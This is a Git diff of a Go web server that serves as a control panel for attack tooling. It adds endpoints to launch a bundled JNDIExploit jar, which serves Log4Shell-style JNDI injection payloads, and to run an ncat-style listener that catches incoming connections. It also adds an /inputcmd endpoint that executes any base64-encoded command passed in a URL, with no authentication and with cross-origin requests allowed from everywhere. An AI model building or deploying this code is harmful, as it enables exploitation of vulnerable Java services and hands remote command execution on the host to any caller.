@@ -1,15 +1,14 @@
 package main
 
 import (
-	"context"
+	"encoding/base64"
 	"fmt"
 	"io"
 	"net"
-	"net/http"
-	"os"
 	"os/exec"
+	"runtime"
 	"strconv"
-	"sync"
+	"strings"
 
 	"github.com/gin-contrib/cors"
 	"github.com/gin-gonic/gin"
@@ -18,6 +17,9 @@ import (
 
 func main() {
 	router := gin.Default()
+	router.Use(cors.New(cors.Config{
+		AllowAllOrigins: true,
+	}))
 	router.GET("/", func(c *gin.Context) {
 		c.JSON(200, gin.H{
 			"message": "Hello, World!",
@@ -64,22 +66,76 @@ func main() {
 	})
 	router.GET("/startncat", func(c *gin.Context) {
 		host := c.DefaultQuery("host", "localhost")
-		port := c.DefaultQuery("port", "8080")
-
-		intPort, err := strconv.Atoi(port)
+		port := c.DefaultQuery("port", "1304")
+		portInt, err := strconv.Atoi(port)
 		if err != nil {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid port number"})
+			c.JSON(400, gin.H{
+				"error": "Invalid port",
+			})
 			return
 		}
-		StartNcat(host, intPort)
-		c.JSON(http.StatusOK, gin.H{"status": "Server started"})
+		go StartNcat(host, portInt)
+		status := <-ncatStatus
+		c.JSON(200, gin.H{
+			"message": status,
+		})
 	})
 	router.GET("/stopncat", func(c *gin.Context) {
-		StopNcat()
-		c.JSON(http.StatusOK, gin.H{"status": "Server stopped"})
+		status := StopNcat()
+		c.JSON(200, gin.H{
+			"message": status,
+		})
 	})
-	router.Use(cors.Default())
-	router.Run(":8080")
+	router.GET("/checkncat", func(c *gin.Context) {
+		status := CheckNcat()
+		c.JSON(200, gin.H{
+			"message": status,
+		})
+	})
+	router.GET("/startjndi", func(c *gin.Context) {
+		status, err := StartJNDIServer()
+		if err != nil {
+			c.JSON(500, gin.H{
+				"error": err.Error(),
+			})
+			return
+		}
+		c.JSON(200, gin.H{
+			"message": status,
+		})
+	})
+	router.GET("/stopjndi", func(c *gin.Context) {
+		status := StopJNDIServer()
+		c.JSON(200, gin.H{
+			"message": status,
+		})
+	})
+	router.GET("/checkjndi", func(c *gin.Context) {
+		status := CheckJNDIServer()
+		c.JSON(200, gin.H{
+			"message": status,
+		})
+	})
+	router.GET("/inputcmd", func(c *gin.Context) {
+		command := c.Query("command")
+		if command == "" {
+			c.JSON(400, gin.H{
+				"error": "Command is required",
+			})
+			return
+		}
+		out, err := InputCMD(command)
+		if err != nil {
+			c.JSON(500, gin.H{
+				"error": err.Error(),
+			})
+			return
+		}
+		c.JSON(200, gin.H{
+			"output": out,
+		})
+	})
+	router.Run(":8000")
 }
 
 // -------------------------- Start of Payload Sender -------------------------- //
@@ -87,6 +143,47 @@ func SendPayload() {
 }
 
 // -------------------------- End of Payload Sender -------------------------- //
+
+// -------------------------- Start of JNDI Server -------------------------- //
+var jndiCmd *exec.Cmd
+
+func StartJNDIServer() (string, error) {
+	jdnipath := "./dependencies/jndiexploit_1.2/JNDIExploit-1.2.jar"
+	javapath := FindJava()
+	intIP, err := GetIntIP()
+	if err != nil {
+		return "", err
+	}
+	cmd := exec.Command(javapath, "-jar", jdnipath, "-i", intIP.String(), "-p", "8888")
+	err = cmd.Start()
+	if err != nil {
+		return "", err
+	}
+	jndiCmd = cmd // Store the command to stop it later
+	return "JNDI server started on " + intIP.String() + ":8888", nil
+}
+
+func StopJNDIServer() string {
+	if jndiCmd != nil && jndiCmd.Process != nil {
+		err := jndiCmd.Process.Kill()
+		if err != nil {
+			return "Error stopping JNDI server: " + err.Error()
+		}
+		jndiCmd = nil // Clear the stored command
+		return "JNDI server stopped"
+	}
+	return "JNDI server is not running"
+}
+
+func CheckJNDIServer() string {
+	if jndiCmd != nil && jndiCmd.Process != nil {
+		return "JNDI server is running"
+	} else {
+		return "JNDI server is not running"
+	}
+}
+
+// -------------------------- End of JNDI Server -------------------------- //
 
 // -------------------------- Start of IP Finder -------------------------- //
 func GetIntIP() (net.IP, error) {
@@ -110,7 +207,6 @@ func GetIntIP() (net.IP, error) {
 			}
 		}
 	}
-	fmt.Println("Error:", err)
 	return nil, err
 }
 
@@ -128,74 +224,98 @@ func GetExtIP() (string, error) {
 // -------------------------- Start of Java Finder -------------------------- //
 func FindJava() string {
 	javapath, err := exec.LookPath("java")
+	os := runtime.GOOS
 	if err != nil {
-		return ""
-	} else {
-		return javapath
+		switch os {
+		// case "windows":
+		// 	javapath = "./dependencies/jdk-22.0.1-windows/bin/java.exe"
+		// case "linux":
+		// 	javapath = "./dependencies/jdk-22.0.1-linux/bin/java"
+		// case "darwin":
+		// 	javapath = "./dependencies/jdk-22.0.1-macos/bin/java"
+		default:
+			javapath = "Error: Unsupported OS"
+		}
 	}
+	return javapath
 }
 
 // -------------------------- End of Java Finder -------------------------- //
 
 // -------------------------- Start of Ncat Server -------------------------- //
-var (
-	serverRunning bool
-	serverCtx     context.Context
-	serverCancel  context.CancelFunc
-	serverWg      sync.WaitGroup
-)
-
-func startNcatServer(host string, port int, ctx context.Context) {
-	defer serverWg.Done()
-	address := fmt.Sprintf("%s:%d", host, port)
-	listener, err := net.Listen("tcp", address)
-	if err != nil {
-		panic(err)
-	}
-	defer listener.Close()
-	for {
-		select {
-		case <-ctx.Done():
-			fmt.Println("Shutting down the server...")
-			return
-		default:
-			conn, err := listener.Accept()
-			if err != nil {
-				fmt.Println("Error:", err)
-				continue
-			}
-			go func(conn net.Conn) {
-				defer conn.Close()
-				_, err := io.Copy(os.Stdout, conn)
-				if err != nil {
-					fmt.Println("Error:", err)
-				}
-			}(conn)
-		}
-	}
-}
+var listener net.Listener
+var ncatStatus = make(chan string, 1) // Buffered channel to hold status messages
 
 func StartNcat(host string, port int) {
-	if serverRunning {
-		fmt.Println("Server is already running")
-		return
-	}
-	serverCtx, serverCancel = context.WithCancel(context.Background())
-	serverWg.Add(1)
-	go startNcatServer(host, 1304, serverCtx)
-	serverRunning = true
-	fmt.Println("Successfully started ncat server.")
+	go func() {
+		var err error
+		listener, err = net.Listen("tcp", fmt.Sprintf("%s:%d", host, port))
+		if err != nil {
+			ncatStatus <- "Error listening: " + err.Error()
+			return
+		}
+		ncatStatus <- "Listening on " + host + ":" + strconv.Itoa(port)
+		for {
+			conn, err := listener.Accept()
+			if err != nil {
+				ncatStatus <- "Error accepting: " + err.Error()
+				return
+			}
+			go handleRequest(conn)
+		}
+	}()
 }
 
-func StopNcat() {
-	if !serverRunning {
-		fmt.Println("Server is not running")
-		return
+func handleRequest(conn net.Conn) {
+	buf := make([]byte, 1024)
+	for {
+		reqLen, err := conn.Read(buf)
+		if err != nil {
+			if err != io.EOF {
+				ncatStatus <- "Error reading: " + err.Error()
+			}
+			break
+		}
+		ncatStatus <- string(buf[:reqLen])
 	}
-	serverCancel()
-	serverWg.Wait()
-	serverRunning = false
-	fmt.Println("[+] Successfully stopped ncat server.")
+	conn.Close()
+}
+
+func StopNcat() string {
+	if listener != nil {
+		err := listener.Close()
+		if err != nil {
+			return "Error closing listener: " + err.Error()
+		}
+		listener = nil
+		return "Ncat server stopped"
+	}
+	return "Ncat server is not running"
+}
+
+func CheckNcat() string {
+	if listener != nil {
+		return "Ncat server is running"
+	} else {
+		return "Ncat server is not running"
+	}
 }
 
 // -------------------------- End of Ncat Server -------------------------- //
+
+func InputCMD(command string) (string, error) {
+	decodedcmd, err := base64.StdEncoding.DecodeString(command)
+	if err != nil {
+		return "", err
+	}
+	parts := strings.Fields(string(decodedcmd))
+	if len(parts) == 0 {
+		return "", fmt.Errorf("no command provided")
+	}
+	cmd := exec.Command(parts[0], parts[1:]...)
+	out, err := cmd.Output()
+	if err != nil {
+		return "", err
+	}
+	return string(out), nil
+}
